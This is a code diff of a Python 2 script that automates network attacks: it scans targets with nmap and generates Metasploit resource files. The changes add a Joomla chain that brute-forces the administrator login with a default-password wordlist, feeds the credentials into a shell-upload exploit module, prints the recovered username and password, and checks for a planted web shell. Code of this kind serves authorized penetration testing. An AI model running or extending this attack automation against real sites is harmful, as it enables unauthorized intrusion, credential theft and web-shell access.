@@ -26,7 +26,6 @@ today = now.strftime("%d-%m-%Y %H:%M")
 postfile = 'post.rc'
 path2post = tLogDir + postfile
 
-
 # test functions:
 #
 
@@ -227,11 +226,11 @@ def check_http(target, rport):
 def check_apache(target, rport):
   print '    + loading : apache modules ...'
   print '      + apache_userdir_enum' 
-  saveNetRc('use auxiliary/scanner/http/apache_userdir_enum\n')
-  saveNetRc('set VERBOSE false\n')
-  saveNetRc('set RHOSTS ' + target + '\n')
-  saveNetRc('set RPORT ' + rport + '\n')
-  saveNetRc('run\n')
+  saveWWWRc('use auxiliary/scanner/http/apache_userdir_enum\n')
+  saveWWWRc('set VERBOSE false\n')
+  saveWWWRc('set RHOSTS ' + target + '\n')
+  saveWWWRc('set RPORT ' + rport + '\n')
+  saveWWWRc('run\n')
 
 # modules for IIS
 def check_iis(target, rport):
@@ -243,25 +242,37 @@ def check_iis(target, rport):
   saveNetRc('run\n')
 
 # modules for Joomla
-def check_joomla(target,rport):
+def check_joomla(target,rport, targeturi):
   print '    + loading : joomla modules, port : ', rport
   print '      + joomla_bruteforce'
   print '      + joomla_version'
   print '      + joomla_plugins'
+  print '      + joomlash' # https://github.com/c610/modules/blob/master/joomlash.rb
   # TODO: finish joomla_upload_shell.rb 
   # TODO: remember to properly set TARGETURI; see: dir_scanner
 
+  print '\n'
+  print '[i] Current TARGETURI to ' + str(targeturi) + '\n'
   saveWWWRc('use auxiliary/scanner/http/joomla_bruteforce_login\n')
-# saveWWWRc('set TARGETURI + ' + targeturi + '\n') TODO
+  saveWWWRc('set TARGETURI + ' + targeturi + '\n') # TODO
   saveWWWRc('set RHOSTS ' + target + '\n')
   saveWWWRc('set RPORT ' + rport + '\n')
-  saveWWWRc('set AUTH_URI /joomla/administrator/index.php \n') # TODO: 3rd param targeturi
+  saveWWWRc('set AUTH_URI /joomla2/administrator/index.php \n') # TODO: 3rd param tmpuri
   saveWWWRc('set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt\n')
   saveWWWRc('set VERBOSE false\n')
   saveWWWRc('set USERNAME admin\n')
-  saveWWWRc('set FORM_URI /joomla/administrator\n')
+  saveWWWRc('set FORM_URI /joomla2/administrator\n') # TODO
   saveWWWRc('set STOP_ON_SUCCESS true\n')
-  saveWWWRc('run\n') # TODO: get admin's login and escalate to shell 
+  saveWWWRc('run\n') # TODO: result (user:pass) to joomlash
+
+  saveWWWRc('use exploit/unix/webapp/joomlash\n')
+  saveWWWRc('set RHOST ' + target + '\n')
+  saveWWWRc('set RPORT ' + rport + '\n')
+  saveWWWRc('set TARGETURI /joomla2/\n') # ' + targeturi + '\n') TODO!
+  saveWWWRc('set USERNAME admin\n') #TODO : connect with joomla_bruteforce_login
+  saveWWWRc('set PASSWORD admin\n')
+  saveWWWRc('run\n')
+
 
   saveWWWRc('use auxiliary/scanner/http/joomla_version\n')
   saveWWWRc('set RHOSTS ' + target + '\n')
@@ -304,7 +315,7 @@ def check_http_dirs(target):
 
   print '[+] Please wait, I\'m reading output from ' + str(rcspool) + '\n'  
   print '[+] Preparing HTTP attacks basing on found directories'
-  for line in lines: # TODO add rport because later it will appear as a bug in readSpool()
+  for line in lines: # TODO 
     if line.find('Found http://') != -1:
 
       # fix: set new rport
@@ -314,9 +325,10 @@ def check_http_dirs(target):
 #      print("Setting new RPORT for this test: " + str(rrport)) # for debug
       if line.find('/administrator/') != -1:
         print '  [+] probably Joomla; preparing tests...'
-        check_joomla(target,rrport)
+        tmpuri = '/administrator/' # TODO change!
+        check_joomla(target, rrport, tmpuri)
 
-      if line.find('/server-status') != -1:
+      elif line.find('/server-status') != -1:
         print '  [+] Found "/server-status"; probably Apache...'
         # TODO: we need a 'marker' to set apache tests already done (if any) 
         check_apache(target,rrport)
@@ -327,12 +339,20 @@ def check_http_dirs(target):
 	check_axis2(target,rrport)
 
       elif line.find('/joomla/') != -1:
-        print '  [+] probably Joola; preparing tests...'
-        check_joomla(target, rrport)
+        print '  [+] probably Joola; preparing tests...' # TODO: change tmpuri 
+        tmpuri = '/joomla/'
+        check_joomla(target, rrport, tmpuri)
+
+      elif line.find('/joomla2/') != -1:
+        print '  [+] probably Joola; preparing tests...' # TODO: change targeturitmp
+        tmpuri = '/joomla2/'
+        check_joomla(target, rrport, targeturi)
 
       elif line.find('.git') != -1:
         print '  [+] probably git found; preparing tests...'
         check_git(target, rrport)
+  tmpuri = '' # TODO  clean
+
 
 # modules if HTTPS found
 def check_https(target, rport):
@@ -430,6 +450,7 @@ def check_5357(target):
 
 # code functions:
 # TODO: readSpool for output.www; more details; ...
+# ...20.08.and.some.changes...
 def thanks():
 # :)
   print '\n'
@@ -443,30 +464,68 @@ def thanks():
   print '  Summary for 1st output:\n'
   fp1 = open(nmaplogfile, 'r')
   s_ports = fp1.readlines()
-  s_i = 0
-  for p in s_ports:
-    if p.find('open') != -1:
-      s_i += 1
-#      print p
 
-  # TODO: separate found and prepared here for tests ;)
+  countScanned = 0
+  foundOpen = 0
+
+  for oport in s_ports:
+    if oport.find('open') != -1:
+      foundOpen += 1
+
+  fp = open(rcfile, 'r') # read all 'use ' 
+  used = fp.readlines()
+  
   print '[+] Ports:'
-  print '    Total: ', s_i
-  print ''
+  print '    Total ports      : ', foundOpen
+
+  for u in used:
+    if u.find('use ') != -1:
+      countScanned += 1
+      nu = u.split(' ')[1]
+      print '    - test used : ' + str(nu) 
+
+  print '    Modules prepared : ', countScanned
+  
+
+
+
+  print '\n'
 
   # summary for 2nd msf 
   print '-'*80
   print '  Summary for 2nd output:\n' # TODO
-#  fp2 = open(wwwspool, 'r') # tmp change for reading output from 1st msf
-  fp2 = open(rcspool,'r')
-  s_ports2 = fp2.readlines()
-  s_i2 = 0
-  for p2 in s_ports2:
-    if p2.find('Found http') != -1:
-      print 'Check link : ', p2
 
+# fp2 = open(wwwspool, 'r') # tmp change for reading output from 1st msf
+
+  fp2 = open(rcspool,'r') # reading from outpupt.msf; looking for 'Found http' links
+  links = fp2.readlines()
+
+  for link in links:
+    if link.find('Found http') != -1:
+      nlink = link.split(' ')
+      codelink = nlink[3]
+      gotlink = nlink[2]
+      print 'Code ' + str(codelink) + ' for : ', str(gotlink) 
+
+  print '\n'
   fp1.close()
   fp2.close()
+
+
+  print '\nNow we will check 2nd file: ' +  str(wwwspool) + '\n'
+
+  readWWW = open(wwwspool,'r')
+  lines = readWWW.readlines()
+
+  for line in lines:
+    if line.find(target) != -1: # TODO : fix this ififififif;[
+      if line.find("Successful login 'admin'") != -1:
+        splitl = line.split("'")
+        print '  Joomla user : ' + str(splitl[1])
+        print '  Joomla pass : ' + str(splitl[3])
+
+    if line.find('templates/beez3/error.php?x=cmd') != -1:
+      print '  [+] It seems to we already have a shell :)\n'
 
 
 # for LHOST 
@@ -486,9 +545,24 @@ def makePost(postme):
   fp.write('exit\n') # TODO: make-meterpreter-exit bug
 
 
+# reading loglines from output.www spool
+# TODO: grab details to exploit bugs and/or prepare summary
+def readSpoolWWW(RCfp):
+  print '[+] Reading spool from : ', RCfp
+  # TODO: tmp solution...
+  fp = open(RCfp)
+  lines = fp.readlines()
+
+  for line in lines:
+    if line.find('admin') != -1:
+      print line
+
+
+  print '[+] Finished reading spool from : ', RCfp
+
 # read loglines from output.msf spool
 # TODO: grab details to exploit bugs and/or prepare summary
-def readSpool(RCfp):
+def readSpoolNet(RCfp):
   print '[+] Reading spool from : ', RCfp
 
   check_http_dirs(target)
@@ -522,12 +596,14 @@ def readScan(nmaplogfile):
 
   for port in ports:
     if port.find('open') != -1:
-
       tmp_port = port.split('/')
       global rport 
+      global targeturi # TODO !
+      global tmpuri
       rport = tmp_port[0]
 
       if port.find('21/tcp') != -1:
+        scannedPort += 1 
         print '[i] FTP found on port : ', rport
         check_21(target)
         if port.find('Microsoft ftpd') != -1:
@@ -597,7 +673,7 @@ def readScan(nmaplogfile):
 def scan(target):
   print '[+] Scanning :', target
   
-  exe = 'nmap -sV -T4 -A -P0 -vv -n ' + target + ' -oN ' + nmaplogfile
+  exe = 'nmap -sV -T4 -A -Pn -vv -n ' + target + ' -oN ' + nmaplogfile
   print '[+] Started!'
   subprocess.call([ exe ], shell=True)
   print '[+] Finished.'
@@ -673,14 +749,14 @@ def sayHi():
 # ...
 sayHi()
 prepareEnv()
-#scan(target)
+scan(target)
 
 readScan(nmaplogfile)
 runMsfScan(rcfile)
-readSpool(rcspool) 
+readSpoolNet(rcspool) 
 
 runMsfScan(rcwww)
-#readSpool(rcwww)
+# readSpoolWWW(rcspool) # print all output.www
 
 thanks() # TODO: detailed summary
 # 
